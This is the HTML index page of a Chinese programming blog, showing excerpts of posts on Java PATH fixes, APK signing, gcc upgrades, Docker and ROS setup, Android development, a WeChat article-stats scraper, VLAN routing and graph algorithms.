<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d893468f20e8f2da1f00ce319cb138a0/" rel="bookmark">
			Java 设置问题【could not open `D:\Program Files (x86)\Java\lib\i386\jvm.cfg】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【遇到的问题】：
（1） 买的新笔记本是 win10 家庭版，玩游戏也是把之前电脑上的 jdk 包直接拷贝过来，然后在游戏中直接指定 Java 路径并运行，并无问题。
（2） 新的工作环境需要在系统环境中配置好 Java，然后在 CMD 输入 “java -version” 报错如下：
“could not open `D:\Program Files (x86)\Java\lib\i386\jvm.cfg”
【解决方法】：
（1）删除 C:\Program Files (x86)\Common Files\Oracle\Java\javapath 下的 java.exe &amp; javaw.exe &amp; javaws.exe 三兄弟
（2）添加环境变量
① 右键 “此电脑”——&gt;“属性” ② 选择 “高级系统设置”
③ 点击 “环境变量”
④ 在系统变量中 “新建” 一个变量
⑤ 添加变量名为 "JAVA_HOME" 的变量
⑥ 编辑 “Path” 变量
⑦ 添加如下两个值 “%JAVA_HOME%\bin” &amp; “%JAVA_HOME%\jre\bin”
⑧ 所有设置完毕记得“确认”后再进行验证
⑨ 在 CMD 下输入 “java -version”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d893468f20e8f2da1f00ce319cb138a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fd10df7b4e9453c267226b4c943f826/" rel="bookmark">
			PAT-B1030/A1085-完美数列 (25分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 给定一个正整数数列，和正整数 p，设这个数列中的最大值是 M，最小值是 m，如果 M≤mp，则称这个数列是完美数列。
现在给定参数 p 和一些正整数，请你从中选择尽可能多的数构成一个完美数列。
输入格式 输入第一行给出两个正整数 N 和 p，其中 N（≤105）是输入的正整数的个数，p（≤109）是给定的参数。第二行给出 N 个正整数，每个数不超过 109。
输出格式 在一行中输出最多可以选择多少个数可以用它们组成一个完美数列。
输入样例 10 8 2 3 20 4 5 1 6 7 8 9 输出样例 8 题目信息 作者：CAO, Peng
单位：Google
代码长度限制：16 KB
时间限制：200 ms
内存限制：64 MB
题目类型：二分-寻找有序数列第一个满足某条件的元素的位置 分析 由于题干中涉及序列的最大值和最小值，因此不妨先将所有N个正整数从小到大进行排序。
在此基础上能证明：能使选出的数个数最大的方案，一定是在该递增序列中选择连续的若干个数的方案。
（如果不想看证明可以跳过）
我们简单解释一下反证法是如何证明结论的：
首先假设能使选出的数个数最大的方案，不是在该递增序列中连续的方案。
那就举个例子： 存在序列 1 2 3 4 5 6 7，我们假设1 2 3 7 满足 M&lt;=m*p的要求，根据假设，1 2 3 7 是满足条件的最大序列，可是当我们取出 1 2 3 4 5 6 7，M还是7，m还是1，既然1 2 3 7满足条件，那么 1 2 3 4 5 6 7一定满足条件，这就与假设矛盾，假设不成立
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0fd10df7b4e9453c267226b4c943f826/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25d0af4f34ca483fc9669b7728afeec0/" rel="bookmark">
			魅族应用市场认领app，解决Invalid keystore format异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要记录呢？因为这里会耗费一点时间，虽然问题不大就是觉得恶心。记一下免得时间一长又忘了！
jarsigner的命令格式
jarsigner -verbose -keystore [您的私钥存放路径] -signedjar [签名后文件存放路径] [未签名的文件路径] [您的证书名称]
#jarsigner的参数说明
-keystore 参数指定您的私钥的绝对路径，例如：c:\mykeystore
-signedjar 参数指定签名后apk文件存放绝对的路径，例如 c:\signed.apk
[未签名的文件路径] 指定要签名apk文件的绝对路径，也就是您从我们这里下载到的，例如 c:\meizuemptyapk-release-unsigned.apk
[您的证书名称] 是指您创建密钥时，您设置的证书名称
1.直接cd 到java的bin目录下 我的是这样的：C:\Program Files\Java\jre1.8.0_131\bin
2.直接放对应三个位置的路径 我的是这样的:jarsigner -verbose -keystore D:\keystore\chongdong.jks -signedjar E:\meizuemptyapk-release-signed.apk E:\sign_verification\meizuemptyapk-release-unsigned.apk chongdong
注意会出现的问题:jarsigner 错误: java.lang.RuntimeException: 密钥库加载: Invalid keystore format
检查命令.如果跟官网案例一样的话是会一直出现的，我开始是按下面的写法一直报错。
错误的写法：jarsigner -verbose -keystore D:\keystore -signedjar meizuemptyapk-release-signed.apk meizuemptyapk-release-unsigned.apk chongdong
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c626ca7bf122328e66cbc835997c73e0/" rel="bookmark">
			cc1: error: unrecognized command line option &#34;-std=c11&#34;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个问题主要是由于gcc版本问题，
root# gcc --version gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-23) Copyright (C) 2010 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE 下载gcc gcc-4.8.2
然后运行
tar -zxvf gcc-4.8.2.tar.gz cd gcc-4.8.2 依赖下载，包里面提供了依赖下载的处理，直接执行：
./contrib/download_prerequisites 如果没有外网，可以查看contrib/download_prerequisites里面内容：
MPFR=mpfr-2.4.2 GMP=gmp-4.3.2 MPC=mpc-0.8.1 wget ftp://gcc.gnu.org/pub/gcc/infrastructure/$MPFR.tar.bz2 || exit 1 tar xjf $MPFR.tar.bz2 || exit 1 ln -sf $MPFR mpfr || exit 1 wget ftp://gcc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c626ca7bf122328e66cbc835997c73e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e39d91087e88d4e69be8ad8ddb44dc2/" rel="bookmark">
			虚拟机重启之后docker无法启动，提示Loaded: error (Reason: Invalid argument)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		重启虚拟机之后，运行docker命令提示docker没有运行，然后启动docker就报错了。
[linmengmeng@localhost ~]$ docker ps Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? [linmengmeng@localhost ~]$ sudo su [sudo] password for linmengmeng: [root@localhost linmengmeng]# systemctl docker start Unknown operation 'docker'. [root@localhost linmengmeng]# systemctl start docker Failed to start docker.service: Unit is not loaded properly: Invalid argument. See system logs and 'systemctl status docker.service' for details. [root@localhost linmengmeng]# systemctl status docker.service ● docker.service - Docker Application Container Engine Loaded: error (Reason: Invalid argument) Active: inactive (dead) Docs: https://docs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e39d91087e88d4e69be8ad8ddb44dc2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc33dbff2dacee97926a908ad8ee8c98/" rel="bookmark">
			Blender v2.79b 的编译与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：判断Blender是否适合自己 搜索外网教程，Sebastian Lague大神录制有Unity中制作RPG游戏等一系列开源的视频教程，其中有用到Blender建立低面数角色、衣服、武器等模型，制作了走、跑、攻击等简单动画。个人认为这是最好的入门教程。B站上有别人搬运的。还有个展UV的教程，不过搬运得不完全。
其他还有几分钟内做个低模并绑定骨骼的快餐式教程，很容易搜到，零基础就可以看。
观看这些教程，了解 Blender 的基本操作模式，决定是否适合自己。（我认为Blender是级联命令式操作，直白讲就是背很多快捷键。）
二：了解 Blender 独特的操作模式。 除了非常重要的快捷键，Blender 很多地方是与众不同的，初次接触可能会不习惯。
快捷键作用域： 每个窗口都是不同的快捷键作用域。具体有哪些呢？File - User Preference - Input 查看快捷键选项：
每一组可以展开的列表都是一个作用域。其中 Window 代表全局快捷键。
当鼠标指针指着 3D视口，当前的快捷键组就是 3D View；指着文本编辑器，当前的快捷键组就是 Text。
可以输入功能名称(Name)或按键组合(Key-Binding)查询相关的快捷键。
v2.8以前，用户设置是不会自动保存的，需要手动点击 Save User Settings
鼠标指针： Blender 没有“当前激活的窗口”，只有“当前鼠标指着的窗口”。这很怪异，因为当你在 Text Editor 敲代码时，鼠标一移开编辑器，编辑器就不接受输入了。
唯一的例外就是文本输入框。
鼠标中键： 按住鼠标中键移动可以平移各种视图，包括文本编辑器。Ctrl+鼠标中键可以自由缩放部分2D/3D视图。
工作区布局： 自定义的工作区布局只保存在当前工程文件中。要使其他工程也使用当前布局，只能将当前工程保存为启动文件(File - Save Startup File)，并且在设置中取消勾选 File - Load UI。
其他奇怪的地方： 左击放置 3D Cursor(新物品的诞生地)，右击选择， A切换全选/全不选。Shift+右击连选。L 选择鼠标指针下的一个Loop。G移动(Grab)，R旋转。X删除。M移动物体到某一层。
右击、A、L、G、R、X等等不仅仅作用于3D视口，其他窗口也可能用得到，比如曲线编辑器(Graph Editor)、动作编辑器(Dope Sheet)。
在3D视口中缩放、移动视图，有时会变得很慢，跟受到了阻滞一样，需要点击小键盘的.按键来重置视口(View Selected)。
三：自定义工作区布局。 点击并拖动左下角的三横图标可以在当前窗口下方克隆一个窗口。窗口类型(Panel Type, PT)可以通过点击下拉图标自由切换。点击并拖动三横图标也可以重新合并分裂出的窗口。
分裂或合并窗口也可以通过右击窗口边框完成。
许多类型的窗口都有可以展开或隐藏的侧栏(Header Type, HT)。隐藏时，在一旁显示如下图标：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc33dbff2dacee97926a908ad8ee8c98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfd2f349b3717a4e00cb73f022637e90/" rel="bookmark">
			微博点赞数等信息和公众号点赞数等信息爬取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：微博 因为GitHub页面中已有非常详细的描述，这里只贴出地址和运行结果。
地址： https://github.com/dataabc/weiboSpider 运行结果：(获取点赞数，转发数，评论数)
二：微信公众号 github地址： https://github.com/wnma3mz/wechat_articles_spider 先看结果图：(获取url和阅读数和点赞数)
2.1 原理介绍 2.1.1 抓取文章url 拥有一个微信个人订阅号，附上登陆和注册链接。微信公众平台登陆之后，点击左侧菜单栏“管理”-“素材管理”。再点击右边的“新建图文素材” 弹出一个新的标签页，在上面的工具栏找到“超链接”并点击
弹出了一个小窗口，选择“查找文章”，输入需要查找的公众号，这里用“科技美学”公众号作为例子
点击之后，可以弹出该公众号的所有历史文章
2.1.2 抓取文章的阅读量和点赞量 1.首先安装Fiddler抓包工具软件
下载链接：https://www.telerik.com/download/fiddler/fiddler4
安装完成，只需点击同意，下一步安装即可。
2.Fiddler相关配置
安装完毕后，按下图图进行配置勾选，然后重启Fiddler。
按图进行配置操作，然后重启Fiddler。
登陆微信客户端，浏览该公众号的任意一篇推文 可以观察到这里的内容显示会有阅读量、点赞量、评论等 观察fiddler的监控数据，如下图显示 其中/mp/getappmgsext?...是我们推文内容的url，双击之后，fiddler界面右边出现如下图数据 2.2 用法 2.2.1 克隆项目并安装依赖 git clone https://github.com/wnma3mz/wechat_articles_spider.git
# 在项目文件夹内
pip install -r requirements.txt
2.2.2 获取微信公众号token和cookie 登录微信公众号， 打开浏览器的开发者选项(F12), 推荐Chrome或者Firefox 2.2.2 获取个人微信号的token和cookie(要打开想要爬的公众号所属文章) 打开fiddler开始监控
登陆微信PC端，浏览该公众号的任意一篇推文
其中/mp/getappmgsext?...是我们推文内容的url，双击之后，fiddler界面右边出现如下图数据 获取token
获取cookie 2.2.3 测试cookie和token(填入相关信息) 方法一(一次性检测)：
# coding=utf-8
import time
from wechatarticles import ArticlesInfo, ArticlesUrls, tools
import pandas as pd
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfd2f349b3717a4e00cb73f022637e90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c78178c991611a8b9e15cbede574fbf/" rel="bookmark">
			MySQL中的ALL字段
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ALL字段不是单独出现的，而是和一些其他字段配合使用，例如UNION、聚合函数的参数。
假设存在如下【Products】表：
一、在聚合函数如SUM，MAX，MIN，AVG等中，ALL是默认行为： select sum(prod_price) from products where vend_id=1003;	# 92.49 select sum(DISTINCT prod_price) from products where vend_id=1003;	# 79.99 select sum(ALL prod_price) from products where vend_id=1003;	# 92.49 可以看到，第一条查询的结果比第二条结果多了，10+2.5。
那么这10+2.5去哪儿了呢？看原数据表，vend_id为1003的商品中，有两件单价为2.5的商品，两件单价为10的商品。
而在第二条查询中，使用了DISTINCT行为，过滤掉了prod_price相同的商品价格。
而在第一条查询中，使用的默认ALL行为，以及第三条查询中显式指定ALL行为，会保留所有的价格信息。
同样在MAX，MIN，AVG，COUNT中也存在默认ALL行为，只是在MAX，MIN中，结果总是唯一值，有无DISTINCT结果总是一样的，无实际意义。
二、在UNION中是否保留重复行 与聚合函数中的默认ALL行为恰好相反，在UNION中不会保留重复信息。如：
select * from products where vend_id=1001 UNION select * from products where prod_price&gt;10; 查看原数据表可以发现商品【ANV03】既属于vend_id=1001的查询，也属于prod_price&gt;10的查询，但在结果中仅保留了一次。
如果我们加入ALL关键字：
可以看到此时，商品【ANV003】出现了两次。
UNION几乎与多个WHERE条件的查询完成相同的工作。但UNION ALL作为UNION的另一种形式，可以完成部分WHERE完成不了的任务。如果确实需要每个条件的匹配行全部出现（包括重复行），则必须使用UNION ALL而不是WHERE。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d0eb65e008631cb78476d818f35030e/" rel="bookmark">
			智能管家App kotlin版(3)——用户注册/登录/忘记重置密码/个人数据编辑开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言:Bmob后端云为我们用户操作带来了极大的便捷，本文章主要是涵盖了一个用户系统逻辑，实现用户的登录，注册，找回密码，修改密码，邮箱验证，以及记住密码等功能的实现，通过本章你可以学习到宝贵的用户操作逻辑，同时可以学习到自定义的Dialog以及头像的选择和裁剪！
此篇文章紧做关于该项目的用户注册/登录/忘记重置密码开发，后续功能实现请关注后续文章！！！
此文章实现功能将过程中，分布展示！！！
一.用户管理—Bmob简单集成 这地方我并没有什么自己的见解，只是按照官方文档，一步步操作罢了
官方文档
二.用户管理—用户注册功能开发 功能截图：
1.在ui包下，创建RegisteredActivity，编写注册界面交互界面：
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:padding="10dp" tools:context=".ui.RegisteredActivity"&gt; &lt;EditText android:id="@+id/et_user" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/text_user_name"/&gt; &lt;EditText android:id="@+id/et_age" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/text_age"/&gt; &lt;EditText android:id="@+id/et_desc" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/text_desc" android:lines="2"/&gt; &lt;RadioGroup android:id="@+id/mRadioGroup" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal"&gt; &lt;RadioButton android:id="@+id/rb_boy" android:layout_width="wrap_content" android:layout_height="wrap_content" android:checked="true" android:text="@string/text_boy"/&gt; &lt;RadioButton android:id="@+id/rb_girl" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="20dp" android:text="@string/text_girl_f"/&gt; &lt;/RadioGroup&gt; &lt;EditText android:id="@+id/et_pass" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/text_password" android:inputType="textPassword"/&gt; &lt;EditText android:id="@+id/et_password" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/text_password_again" android:inputType="textPassword" /&gt; &lt;EditText android:id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d0eb65e008631cb78476d818f35030e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c070ed0c7e8b26e3fbaf2d9d5250df46/" rel="bookmark">
			计算全班学生C&#43;&#43;课程的总成绩和平均成绩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 定义一个类Student，记录学生C++课程的成绩。要求使用静态数据成员或静态成员函数计算全班学生C++课程的总成绩和平均成绩。
输入格式: 输入5个不超过100的正整数，作为C++成绩。
输出格式: 在第一行中输出成绩的和，第二行输出平均成绩。
输入样例: 90 80 70 60 50
输出样例: 350 70
我的代码：
#include &lt;iostream&gt; using namespace std; class Student{ static int totalscore; int score; public: Student(int s){ score=s; } static void get(int score){ totalscore+=score; } static void output(){ cout&lt;&lt;totalscore&lt;&lt;endl; totalscore/=5; cout&lt;&lt;totalscore&lt;&lt;endl; } }; int Student::totalscore=0; int main(){ int i,s; for(i=0;i&lt;5;i++){ cin&gt;&gt;s; Student st(s); st.get(s); } Student st(5); st.output(); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d031453ad6cd94972a03923e2ea6db2/" rel="bookmark">
			【Android】简单理解View的绘制流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 测量MeasureView.onMeasure()FrameLayout.onMeasure()ViewGroup.measureChildWithMargins()ViewGroup.getChildMeasureSpec()总结 布局LayoutFrameLayout.onLayout()FrameLayout.layoutChildren()总结 绘制DrawView.draw()ViewGroup.dispatchDraw()总结 总结 测量Measure 首先，可以明确知道一个Activity的根View是DecorView，而DecorView extends FramLayout extends ViewGroup extends View。根据源码追踪，发现最先调用的是View.measure()。
public final void measure(int widthMeasureSpec, int heightMeasureSpec) { ... if (forceLayout || needsLayout) { ... if (cacheIndex &lt; 0 || sIgnoreMeasureCache) { // measure ourselves, this should set the measured dimension flag back onMeasure(widthMeasureSpec, heightMeasureSpec); mPrivateFlags3 &amp;= ~PFLAG3_MEASURE_NEEDED_BEFORE_LAYOUT; } else { ... } ... } ... } 首先注意到这个方法是被final修饰的，这意味着开发者无法重写该方法。但是可以看到，实际的测量方法是在onMeasure()中的。
View.onMeasure() 这个时候查看ViewGroup源码发现没有重写onMeasure()，但是在FramLayout中对这个方法进行了重写。想想也是，毕竟不同的控件对测量的方式肯定是不同的。但是在看FramLayout.onMeasure()之前，我们需要先看看默认的测量是怎么样的。
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { setMeasuredDimension( getDefaultSize(getSuggestedMinimumWidth(), widthMeasureSpec), getDefaultSize(getSuggestedMinimumHeight(), heightMeasureSpec)); } /** * 如果父view给定了size，那么就用父view的。 * 否则就用最小值(minHeight/minWidth)或者背景的宽高。 */ public static int getDefaultSize(int size, int measureSpec) { int result = size;// 最小值或者背景的最小值 int specMode = MeasureSpec.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d031453ad6cd94972a03923e2ea6db2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/268e4202358aaa7662d2695025547fdd/" rel="bookmark">
			Android之NDK开发入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意：本文操作环境为mac，Android Studio版本3.5
Android之NDK开发入门 前言一、安装和配置NDK1.安装NDK2.配置NDK环境 二、CMake的方式编译生成so库1. Android Studio自动生成的示例1.1 新建Native C++工程1.2 分析AS创建和添加的文件 2. 自己编写的so库 三、使用CMake引入第三方so库1. 引入JNI规范的so2. 引入第三方so库和头文件 四、踩坑总结 前言 NDK全称Native Development Kit，是Android的一个工具开发包，能够快速开发C,C++的动态库，并自动将so和应用打包成APK。而NDK的使用场景就是通过NDK在Android中使用JNI，那么JNI又是啥呢？JNI全称是Java Native Interface，即Java的本地接口，JNI可以使得Java与C，C++语言进行交互。这么一来，通过NDK和JNI，就可以很方便的在Android的开发环境中使用c,c++的开源库。
一、安装和配置NDK 1.安装NDK 可通过Android Studio下载和官网下载，下面为Android Studio下载
打开Android Studio，点击Android Studio-&gt;Preferences,搜索SDK，然后在SDK Tools中勾选LLDB，NDK，Cmke进行下载。其中LLDB是调试本地代码的工具，可调试C++代码打开File-&gt;Project Structure，然后在SDK Location中配置NDK路径，点击右下角就会出现我们刚刚下载的NDK路径，点击Default NDK路径即可，如果是在官网中下载的，可以根据自己下载的路径进行配置
2.配置NDK环境 启动终端，进入当前用户的home目录
cd ~(注意中间的空格) 创建.bash_profile（假如之前已经创建好了，执行这个命令行不会对原本的文件内容造成影响）
终端输入：touch .bash_profile 查看、编辑.bash_profile
如果忘记了NDK的目录，可以通过Android Studio的File-&gt;Project Structure中的NDK location查看
export NDK_ROOT=/Users/{你的用户名}/Library/Android/sdk/ndk-bundle export PATH=$PATH:$NDK_ROOT 保存然后关闭.bash_profile文件
更新刚配置的环境变量
终端输入： source .bash_profile 重新打开终端，检查是否配置成功（如果不成功，记得先关闭当前终端然后打开）
终端输入： ndk-build 如果出现下列结果的即为成功
Android NDK: Could not find application project directory ! Android NDK: Please define the NDK_PROJECT_PATH variable to point to it.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/268e4202358aaa7662d2695025547fdd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8f7fd1d0ed8e31d53c7635a736c8420/" rel="bookmark">
			vlan之间的静态路由
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要求： 1. 按照拓扑所示，自行选择机柜内设备完成网络搭建； 2. 请根据上图信息完成对三层交换机端口的VLAN分配和绑定； 3. 对vlan进行IP地址分配和绑定； 4. 完成路由器基本配置； 5. 实 现PC1、PC2的之间可以互相ping通。 设备的IP地址 设备IP地址子网掩码网关对应接口PC1192.168.1.2255.255.255.128192.168.1.1Ethernet0/0/1PC2192.168.1.130255.255.255.128192.168.1.129Ethernet0/0/1S1192.168.1.1255.255.255.128×GigabitEthernet0/0/2192.168.1.129255.255.255.128×GigabitEthernet0/0/3192.168.10.2255.255.255.0×GigabitEthernet0/0/4R1192.168.10.1255.255.255.0×GigabitEthernet0/0/0172.168.1.2255.255.255.0×GigabitEthernet0/0/1S2172.168.1.1255.255.255.0×GigabitEthernet0/0/0 实验环节 S1 &lt;Huawei&gt;system [Huawei]vlan batch 10 20 30 [Huawei]int GigabitEthernet 0/0/2 [Huawei-GigabitEthernet0/0/2]port link-type access [Huawei-GigabitEthernet0/0/2]port default vlan 10 [Huawei-GigabitEthernet0/0/2]int GigabitEthernet 0/0/3 [Huawei-GigabitEthernet0/0/3]port link-type access [Huawei-GigabitEthernet0/0/3]port default vlan 20 [Huawei-GigabitEthernet0/0/3]int GigabitEthernet 0/0/1	[Huawei-GigabitEthernet0/0/1] port link-type access [Huawei-GigabitEthernet0/0/1] port default vlan 30 [Huawei-GigabitEthernet0/0/1]int vlan 10 [Huawei-Vlanif10]ip addressress 192.168.1.1 255.255.255.128 [Huawei-Vlanif10]int vlan 20 [Huawei-Vlanif20]ip addressress 192.168.1.129 255.255.255.128 [Huawei-Vlanif20]int vlan 30 [Huawei-Vlanif30]ip address 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8f7fd1d0ed8e31d53c7635a736c8420/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cedddb0e2bb221676ce55eefe207311/" rel="bookmark">
			Ubuntu18.04安装ROS Melodic（详细，亲测安装完成，有清晰的截图步骤）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这也是我在Ubuntu里面安装ROS的第N次，以前每次安装过程都忘记总结了，导致每次安装ROS都浪费了很多的时间用来解决各种问题。为了避免自己以后出现问题需要再安装，所以写这篇博客总结一下，这次是我安装最快，问题最少也最好解决的一次，在网上看了好多安装方法，有些会出现问题，不知道什么原因，解决办法也有点复杂，因此希望这个对大家有用！ Ubuntu18.04安装ROS Melodic目录 一、Ubuntu不同的版本对应ROS不同的版本二、配置Ubuntu软件库三、安装过程及问题解决四、启动运行小海龟例子 一、Ubuntu不同的版本对应ROS不同的版本 操作系统为Ubuntu 18.04 LTS 64bit应采用ROS版本为ROS Melodic。
二、配置Ubuntu软件库 配置Ubuntu存储库以允许"main", “restricted” ，“universe，” and “multiverse”，如图所示
三、安装过程及问题解决 1.设置安装源
避免后面会出现无法定位软件包的错误，这里ROS提供了国内的安装源，添加国内安装源命令 sudo sh -c '. /etc/lsb-release &amp;&amp; echo "deb http://mirrors.ustc.edu.cn/ros/ubuntu/ $DISTRIB_CODENAME main" &gt; /etc/apt/sources.list.d/ros-latest.list' 2.设置密钥
若密钥服务器hkp://ha.pool.sks-keyservers.com:80无法添加成功，则可以尝试hkp://pgp.mit.edu:80或者hkp://keyserver.ubuntu.net:80我使用的是下面这句命令是执行成功了的 sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-key 421C365BD9FF1F717815A3895523BAEEB01FA116 3.更新Ubuntu 18.04 LTS的最新可用软件包列表
sudo apt update 如果出现如下错误
W: GPG 错误：http://mirrors.ustc.edu.cn/ros/ubuntu bionic InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY F42ED6FBAB17C654
E: 仓库 “http://mirrors.ustc.edu.cn/ros/ubuntu bionic InRelease” 没有数字签名。
N: 无法安全地用该源进行更新，所以默认禁用该源。
N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
解决办法，执行如下命令
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cedddb0e2bb221676ce55eefe207311/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d429e9aa1c1562ea76eb7526205d61e/" rel="bookmark">
			Dijkstra算法和Floyd算法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		区别：Dijkstra算法是求单元最短路径的算法，，即是求某个顶点到其余各顶点的最短路径。而Floyd算法是求任意两个顶点之间的最短路径。
Dijkstra算法（迪杰斯特拉算法） 基于贪心策略
具体步骤： 声明一个数组来保存起始点到各个顶点的最短距离和一个保存已经找到了最短路径的顶点集合S，剩余顶点的集合V。初始时，S中只有起始点然后从剩余顶点中找到一个点使得从从起始点到该点的路径是最短路径，并且把该点加入到S中。然后我们需要看看新加入的顶点是否可以到达其他顶点并且看看通过该顶点到达其他点的路径长度是否比源点直接到达短，如果是，那么就修改这些顶点在数组中的值。 然后，重复上述动作，直到S中包含了图的所有顶点。 下图为v1到各终点dist值和最短路径的求解过程：
人们可能只希望找到从源点到某一个特定顶点的最短路径，但是，这个问题和求解源点到其他所有顶点的最短路径一样复杂， 其时间复杂度也为O(|V|^2)。而如果要找出所有结点对之间的最短距离，则需要对每个结点运行次Dijkstra 算法，即时间复杂度为O(|V|^3)。
Floyd算法 是一个经典的动态规划算法
算法步骤： 初始时，对于任意两个顶点，若他们之间存在边，则以此边上的权值作为它们之间的最短路径长度，若不存在有向边，则以∞作为它们之间的最短路径长度，之后逐步尝试在原路径中加入顶点作为中间顶点，如果增加中间顶点后，得到的路径比原来的路径短，则以此新路径代替原路径。 Floyd算法的时间复杂度为O(|V|^3)，也可以用单源最短路径算法来解决每对顶点之间最短路径问题。每一次运行时，轮流将一个顶点作为源点，并且若所有边权值均为非负时，可以采用上面提到的Dijkstra算法，其时间复杂度为O(|V|^2)*|V|=O(|V|^3)。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01cf56658072cd06c34d1ae8f1d396b2/" rel="bookmark">
			最小生成树——Prim算法和Kruskal算法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
